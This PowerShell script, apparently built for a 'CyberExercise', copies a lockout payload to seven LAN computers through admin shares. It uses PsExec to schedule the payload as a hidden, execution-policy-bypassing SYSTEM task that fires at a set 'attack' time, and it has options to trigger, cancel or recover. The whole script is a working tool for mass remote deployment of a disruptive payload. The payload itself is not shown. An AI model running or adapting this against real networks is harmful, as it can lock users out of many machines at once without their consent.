#==============================================================================
# DEPLOY_ALL.ps1 — Master Script: Deploy lockout to all 7 PCs from one machine
# Uses PsExec + admin shares (\\PC\C$) to push scripts and schedule tasks
#
# Prerequisites:
#   - PsExec.exe in the same folder (or in PATH)
#   - Admin credentials valid on all 7 PCs
#   - File sharing enabled (admin shares C$ accessible)
#   - All PCs reachable on the LAN
#
# Usage:
#   .\deploy_all.ps1                              → deploy for today at 14:30
#   .\deploy_all.ps1 -AttackTime "15:00"           → custom time
#   .\deploy_all.ps1 -AttackDate "2026-03-20"      → custom date
#   .\deploy_all.ps1 -Action trigger               → force trigger NOW on all PCs
#   .\deploy_all.ps1 -Action cancel                → cancel on all PCs before it fires
#   .\deploy_all.ps1 -Action recover               → emergency recovery on all PCs
#==============================================================================

param(
    [ValidateSet("deploy", "trigger", "cancel", "recover")]
    [string]$Action = "deploy",

    [string]$AttackTime = "14:30",
    [string]$AttackDate = (Get-Date).ToString("yyyy-MM-dd"),

    [string]$Username = "",
    [string]$Password = ""
)

# =============================================
# CONFIGURATION — Edit these IPs/hostnames
# =============================================
$TargetPCs = @(
    "192.168.1.11"    # PC-01
    "192.168.1.12"    # PC-02
    "192.168.1.13"    # PC-03
    "192.168.1.14"    # PC-04
    "192.168.1.15"    # PC-05
    "192.168.1.16"    # PC-06
    "192.168.1.17"    # PC-07
)
# =============================================

# --- Locate PsExec ---
$PsExec = Join-Path $PSScriptRoot "PsExec.exe"
if (!(Test-Path $PsExec)) {
    $PsExec = Join-Path $PSScriptRoot "PsExec64.exe"
}
if (!(Test-Path $PsExec)) {
    # Try PATH
    $PsExec = (Get-Command PsExec.exe -ErrorAction SilentlyContinue).Source
}
if (!$PsExec -or !(Test-Path $PsExec)) {
    Write-Host "[!] ERROR: PsExec.exe not found. Place it in the same folder as this script." -ForegroundColor Red
    exit 1
}

# --- Build credential args for PsExec ---
$CredArgs = @()
if ($Username -and $Password) {
    $CredArgs = @("-u", $Username, "-p", $Password)
}
elseif ($Username) {
    $CredArgs = @("-u", $Username)
}

# --- Locate payload script ---
$PayloadScript = Join-Path $PSScriptRoot "lockout_pc.ps1"
$RecoverScript = Join-Path $PSScriptRoot "recover_pc.ps1"

# --- Helper: test if PC is reachable ---
function Test-PC($ip) {
    return (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue)
}

# =============================================
# ACTION: DEPLOY
# =============================================
if ($Action -eq "deploy") {
    if (!(Test-Path $PayloadScript)) {
        Write-Host "[!] ERROR: lockout_pc.ps1 not found in script folder." -ForegroundColor Red
        exit 1
    }

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Yellow
    Write-Host "  DEPLOYING LOCKOUT TO ALL PCs" -ForegroundColor Yellow
    Write-Host "  Attack: $AttackDate at $AttackTime" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Yellow
    Write-Host ""

    $success = 0
    $failed = 0

    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline

        # Check reachability
        if (!(Test-PC $pc)) {
            Write-Host "UNREACHABLE — skipped" -ForegroundColor Red
            $failed++
            continue
        }

        try {
            # Step 1: Create remote directory via admin share
            $remotePath = "\\$pc\C$\CyberExercise"
            if (!(Test-Path $remotePath)) {
                New-Item -ItemType Directory -Path $remotePath -Force | Out-Null
            }

            # Step 2: Copy payload script
            Copy-Item -Path $PayloadScript -Destination "$remotePath\payload.ps1" -Force

            # Step 3: Use PsExec to create the scheduled task remotely
            $triggerStr = "$AttackDate" + "T" + "$AttackTime"
            $psexecArgs = @(
                "\\$pc"
            ) + $CredArgs + @(
                "-s"          # Run as SYSTEM
                "-h"          # Run elevated
                "-accepteula" # Auto-accept EULA
                "schtasks.exe"
                "/create"
                "/tn", "CyberExercise_Lockout"
                "/tr", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\CyberExercise\payload.ps1"
                "/sc", "once"
                "/st", $AttackTime
                "/sd", ($AttackDate -replace "-", "/")
                "/ru", "SYSTEM"
                "/rl", "HIGHEST"
                "/f"
            )

            $result = & $PsExec @psexecArgs 2>&1
            
            Write-Host "ARMED" -ForegroundColor Green
            $success++
        }
        catch {
            Write-Host "FAILED — $($_.Exception.Message)" -ForegroundColor Red
            $failed++
        }
    }

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "  Results: $success armed / $failed failed" -ForegroundColor Cyan
    Write-Host "  Attack fires at $AttackTime" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Green
}

# =============================================
# ACTION: TRIGGER NOW (manual fire)
# =============================================
elseif ($Action -eq "trigger") {
    Write-Host ""
    Write-Host "  TRIGGERING LOCKOUT ON ALL PCs NOW" -ForegroundColor Red
    Write-Host ""

    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline
        if (!(Test-PC $pc)) {
            Write-Host "UNREACHABLE" -ForegroundColor Red
            continue
        }

        $psexecArgs = @("\\$pc") + $CredArgs + @(
            "-s", "-h", "-d", "-accepteula"
            "powershell.exe"
            "-ExecutionPolicy", "Bypass"
            "-WindowStyle", "Hidden"
            "-File", "C:\CyberExercise\payload.ps1"
        )
        & $PsExec @psexecArgs 2>&1 | Out-Null
        Write-Host "FIRED" -ForegroundColor Red
    }
}

# =============================================
# ACTION: CANCEL (before it fires)
# =============================================
elseif ($Action -eq "cancel") {
    Write-Host ""
    Write-Host "  CANCELLING ON ALL PCs" -ForegroundColor Yellow
    Write-Host ""

    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline
        if (!(Test-PC $pc)) {
            Write-Host "UNREACHABLE" -ForegroundColor Red
            continue
        }

        # Delete scheduled task
        $psexecArgs = @("\\$pc") + $CredArgs + @(
            "-s", "-h", "-accepteula"
            "schtasks.exe", "/delete", "/tn", "CyberExercise_Lockout", "/f"
        )
        & $PsExec @psexecArgs 2>&1 | Out-Null

        # Remove files
        $remotePath = "\\$pc\C$\CyberExercise"
        Remove-Item -Path $remotePath -Recurse -Force -ErrorAction SilentlyContinue

        Write-Host "CANCELLED" -ForegroundColor Green
    }
}

# =============================================
# ACTION: RECOVER (emergency undo)
# =============================================
elseif ($Action -eq "recover") {
    if (!(Test-Path $RecoverScript)) {
        Write-Host "[!] ERROR: recover_pc.ps1 not found in script folder." -ForegroundColor Red
        exit 1
    }

    Write-Host ""
    Write-Host "  EMERGENCY RECOVERY ON ALL PCs" -ForegroundColor Green
    Write-Host ""

    foreach ($pc in $TargetPCs) {
        Write-Host "[$pc] " -NoNewline
        if (!(Test-PC $pc)) {
            Write-Host "UNREACHABLE — needs manual recovery" -ForegroundColor Red
            continue
        }

        try {
            # Copy recovery script
            $remotePath = "\\$pc\C$\CyberExercise"
            if (!(Test-Path $remotePath)) {
                New-Item -ItemType Directory -Path $remotePath -Force | Out-Null
            }
            Copy-Item -Path $RecoverScript -Destination "$remotePath\recover.ps1" -Force

            # Execute recovery
            $psexecArgs = @("\\$pc") + $CredArgs + @(
                "-s", "-h", "-accepteula"
                "powershell.exe"
                "-ExecutionPolicy", "Bypass"
                "-File", "C:\CyberExercise\recover.ps1"
            )
            & $PsExec @psexecArgs 2>&1 | Out-Null
            Write-Host "RECOVERED" -ForegroundColor Green
        }
        catch {
            Write-Host "FAILED — needs manual recovery" -ForegroundColor Red
        }
    }
}
